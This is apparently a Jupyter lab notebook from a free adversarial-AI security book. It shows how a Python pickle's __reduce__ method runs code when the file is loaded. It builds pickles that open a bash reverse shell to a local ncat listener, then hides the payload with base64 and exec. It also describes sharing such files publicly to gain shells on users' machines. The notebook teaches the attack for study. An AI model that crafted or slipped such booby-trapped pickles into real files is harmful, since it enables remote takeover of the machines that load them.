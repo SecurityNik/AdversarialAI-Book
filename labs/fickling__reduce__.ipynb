{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cd619105",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56d9723d",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(fickling_reduce.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7126f9b",
   "metadata": {},
   "source": [
    "### Fickling Reduce   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74a710fb",
   "metadata": {},
   "source": [
    "### Lab Objectives:   \n",
    "- Truly understanding the problem   \n",
    "- Learning about __reduce__\n",
    "- Intro to Python class"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "85d33643",
   "metadata": {},
   "source": [
    "### Step 1:   \n",
    "Understanding the problem. It's a somewhat simple issue  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "616e7779",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the needed libraries\n",
    "import numpy as np\n",
    "import pickle\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "3a0c0fb2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Numpy version used:  2.1.3\n"
     ]
    }
   ],
   "source": [
    "### Version of key libraries used  \n",
    "print(f'Numpy version used:  {np.__version__}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5f2245d2",
   "metadata": {},
   "source": [
    "Now that we have learned how to do Fickling with tools, let's do it on our own. This is the core of the problem. __reduce__   \n",
    "- https://docs.python.org/3/library/pickle.html#object.__reduce__   \n",
    "- https://hiddenlayer.com/innovation-hub/machine-learning-threat-roundup/   \n",
    "- https://hiddenlayer.com/innovation-hub/pickle-strike/   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "441d88fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Setup a simple Python class\n",
    "class MaliciousClass:\n",
    "    # Setup the constructor\n",
    "    def __init__(self, ):\n",
    "        pass\n",
    "    \n",
    "    # This is where the problem is.\n",
    "    # This method is called when the item gets pickled\n",
    "    def __reduce__(self):\n",
    "        # here is an example of us returning malicious code\n",
    "        # Grab the username and hostname from the system loading the pickle file\n",
    "        # The returned object is called the **reduce value**\n",
    "        # It can be either a string or preferably a tuple\n",
    "        # We must provide a tuple of arguments\n",
    "        # Remember, to setup your listener on the remote device \n",
    "        # if it is not running\n",
    "        #   $ ncat --verbose --listen 9999  --keep-open\n",
    "\n",
    "        # If this works, we should have access to a reverse shell \n",
    "        # On the system running the ncat listener  \n",
    "        return (os.system, (\"/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1 &'\",))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "9da942b3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<__main__.MaliciousClass at 0x7fb23c2d5a90>"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Instantiate the class\n",
    "mal_data = MaliciousClass()\n",
    "mal_data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "2fd44033",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Save the content as a pickle file\n",
    "# Important that we write this as binary\n",
    "# Hence the mode='wb' \n",
    "with open(file=r'/tmp/malicious.pkl', mode='wb') as mal_pkl:\n",
    "    pickle.dump(obj=mal_data, file=mal_pkl)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b89ef97a",
   "metadata": {},
   "source": [
    "Assuming we shared this file on a public repository, when the user downloads the file and loads it on their machine, we should be able to gain shell. \n",
    "\n",
    "Note, we have to set allow_pickle=True for the np.load below. If you set allow_pickle=False (the default state) we will not be able to load Pickle files in general. Notice this is targeting numpy. We did no use numpy prior to loading this file.  This tells you immediately that Numpy is also impacted by Pickle insecurities.  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30ecc6bb",
   "metadata": {},
   "source": [
    "### Step 2: \n",
    "Loading the malicious file   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "4d2375a9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load the file  \n",
    "np.load(file=r'/tmp/malicious.pkl', allow_pickle=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f242965",
   "metadata": {},
   "source": [
    "Looking above, you should see a *0* after running the cell. This is the return code which suggest some code was successfully executed.   \n",
    "\n",
    "Going back to our terminal, we should see that this worked as you now have a reverse shell, granting you access to the machine.   \n",
    "\n",
    "**Ncat: Connection from 127.0.0.1:39452.**   \n",
    "\n",
    "Simply type any Linux command such as **pwd** and you should see the results on the screen.   \n",
    "\n",
    "Cool that works, let's make it a bit more interesting. Let's first base64 encode the data and provide the base64 encoded input as our malicious command\n",
    "\n",
    "\n",
    "### Step 3:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "3e03492a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# First let us import our libraries\n",
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "d204f932",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"/bin/bash -c 'bash -i >& /dev/tcp/127.0.101/9999 0>&1 &'\""
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Setup our string to encode\n",
    "attack_command = \"/bin/bash -c 'bash -i >& /dev/tcp/127.0.101/9999 0>&1 &'\"\n",
    "attack_command"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "eca15070",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjEwMS85OTk5IDA+JjEgJic='"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "Encode the string as a utf-8 character encoding\n",
    "Then base64 encode the utf-8 encoded strings\n",
    "Note we could have done all of this via an external tool \n",
    "such as CyberChef: https://cyberchef.io/   \n",
    "or the Linux command line: \n",
    "$ echo \"/bin/bash -c 'bash -i >& /dev/tcp/127.0.101/9999 0>&1 &'\" | base64\n",
    "    L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjEwMS85OTk5IDA+JjEgJicK\n",
    "\n",
    "and simply bring the base64 encoded content here\n",
    "We are just going to run this in here. \n",
    "No need to go to the load_model script\n",
    "'''\n",
    "attack_command_b64_enc = base64.b64encode(s=bytes(attack_command, encoding='utf-8'))\n",
    "attack_command_b64_enc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "15c5865c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"/bin/bash -c 'bash -i >& /dev/tcp/127.0.101/9999 0>&1 &'\""
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's ensure we can recover the original content, before trying to use it otherwise\n",
    "base64.b64decode(s=attack_command_b64_enc)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "83350097",
   "metadata": {},
   "source": [
    "Good! This suggest we can recover our original content.   \n",
    "Moving ahead\n",
    "\n",
    "### Step 4:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "029c4631",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Setup the class again\n",
    "class MaliciousClass:\n",
    "    def __init__(self, ):\n",
    "        pass\n",
    "    \n",
    "    def __reduce__(self):\n",
    "        \n",
    "        # This time provide the base64 encoded content.\n",
    "        # Do remember to run your ncat session on the remote host \n",
    "        # if it is not running\n",
    "        # ncat --verbose --listen 9999  --keep-open\n",
    "        return (os.system, (base64.b64decode(s=attack_command_b64_enc).decode('utf-8'),))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "012755dc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<__main__.MaliciousClass at 0x7fb23c2d6390>"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Instantiate the class again\n",
    "mal_data_b64 = MaliciousClass()\n",
    "mal_data_b64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "0a5f5cf6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Write the file with the base64 encoded content\n",
    "with open(file=r'/tmp/malicious_b64.pkl', mode='wb') as mal_pkl:\n",
    "\n",
    "    # Dump the file to the filesystem\n",
    "    pickle.dump(obj=mal_data_b64, file=mal_pkl)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "24c63113",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load the file with the base64 encoded content\n",
    "# Remember to setup your ncat session for the incoming sesion\n",
    "# if it is not running\n",
    "#   $ ncat --verbose --listen 9999 --keep-open\n",
    "np.load(file=r'/tmp/malicious_b64.pkl', allow_pickle=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56ba4d42",
   "metadata": {},
   "source": [
    "### Interesting so far!\n",
    "So far, all of that seems interesting. However, we only used a one liner. Could we have used a script?  \n",
    "\n",
    "Let us try that.  \n",
    "\n",
    "### Step 5:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "e19b41a8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the pickle library\n",
    "import pickle"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "555d8c59",
   "metadata": {},
   "source": [
    "Remember to setup your ncat session if it is not running    \n",
    "$ ncat --verbose --listen 9999 --keep-open"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "178a419e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting up a backdoor to: 127.0.0.1:9999\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's just use this to load another malicious file within here\n",
    "def some_function(remote_host:str='127.0.0.1', remote_port=9999):\n",
    "    print(f'Setting up a backdoor to: {remote_host}:{remote_port}')    \n",
    "    return os.system(f\"/bin/bash -c 'bash -i >& /dev/tcp/{remote_host}/{remote_port} 0>&1 &'\")\n",
    "\n",
    "# Call the function. \n",
    "some_function()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a50a2902",
   "metadata": {},
   "source": [
    "Calling the function above is just to ensure everything is working as expected"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "6b7f2a37",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ZGVmIHNvbWVfZnVuY3Rpb24ocmVtb3RlX2hvc3Q6c3RyPScxMjcuMC4wLjEnLCByZW1vdGVfcG9ydD05OTk5KToKICAgIHByaW50KGYnU2V0dGluZyB1cCBhIGJhY2tkb29yIHRvOiB7cmVtb3RlX2hvc3R9OntyZW1vdGVfcG9ydH0nKSAgICAKICAgIHJldHVybiBvcy5zeXN0ZW0oZiIvYmluL2Jhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3Ave3JlbW90ZV9ob3N0fS97cmVtb3RlX3BvcnR9IDA+JjEgJiciKQoKIyBDYWxsIHRoZSBmdW5jdGlvbgpzb21lX2Z1bmN0aW9uKCk=\n"
     ]
    }
   ],
   "source": [
    "# Let's use CyberChef now to encode the function and the call \n",
    "# Basically, take the entire cell above and base64 encode it\n",
    "# use https://cyberchef.io/ as an option\n",
    "# This is what we get\n",
    "cyber_chef_encode_func = \"\"\"ZGVmIHNvbWVfZnVuY3Rpb24ocmVtb3RlX2hvc3Q6c3RyPScxMjcuMC4wLjEnLCByZW1vdGVfcG9ydD05OTk5KToKICAgIHByaW50KGYnU2V0dGluZyB1cCBhIGJhY2tkb29yIHRvOiB7cmVtb3RlX2hvc3R9OntyZW1vdGVfcG9ydH0nKSAgICAKICAgIHJldHVybiBvcy5zeXN0ZW0oZiIvYmluL2Jhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3Ave3JlbW90ZV9ob3N0fS97cmVtb3RlX3BvcnR9IDA+JjEgJiciKQoKIyBDYWxsIHRoZSBmdW5jdGlvbgpzb21lX2Z1bmN0aW9uKCk=\"\"\"\n",
    "\n",
    "print(cyber_chef_encode_func)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "76a443af",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Final version of this attack\n",
    "class MaliciousClass:\n",
    "    def __init__(self, ):\n",
    "        pass\n",
    "    \n",
    "    def __reduce__(self):\n",
    "        \n",
    "        # This time provide the base64 encoded content.\n",
    "        # Do remember to run your ncat session on the remote host \n",
    "        # Well at this you know what to do or just revisit above \n",
    "        # Notice the call to decode here\n",
    "        return (exec, (base64.b64decode(s=cyber_chef_encode_func).decode('utf-8')   ,))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "f7b87fa9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<__main__.MaliciousClass at 0x7fb23c2d75c0>"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Instantiate the function\n",
    "mal_data_script = MaliciousClass()\n",
    "mal_data_script"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "8e145a04",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Write the file with the base64 encoded content\n",
    "# back to disk\n",
    "with open(file=r'/tmp/malicious_b64_cf.pkl', mode='wb') as mal_pkl:\n",
    "\n",
    "    # Dump the file to disk\n",
    "    pickle.dump(obj=mal_data_script, file=mal_pkl)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "9fab04d0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting up a backdoor to: 127.0.0.1:9999\n"
     ]
    }
   ],
   "source": [
    "# That's it!\n",
    "# Load the file with the base64 encoded function \n",
    "np.load(file=r'/tmp/malicious_b64_cf.pkl', allow_pickle=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "70281ef6",
   "metadata": {},
   "source": [
    "### Lab Takeaways:  \n",
    "- We learnt that the core issue with pickle format is __reduce__  \n",
    "- We have looked at fickling from different perspectives   \n",
    "- We have exploited pickle files from different perspectives   \n",
    "- We leverage base64 encoding  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "40302bbf",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
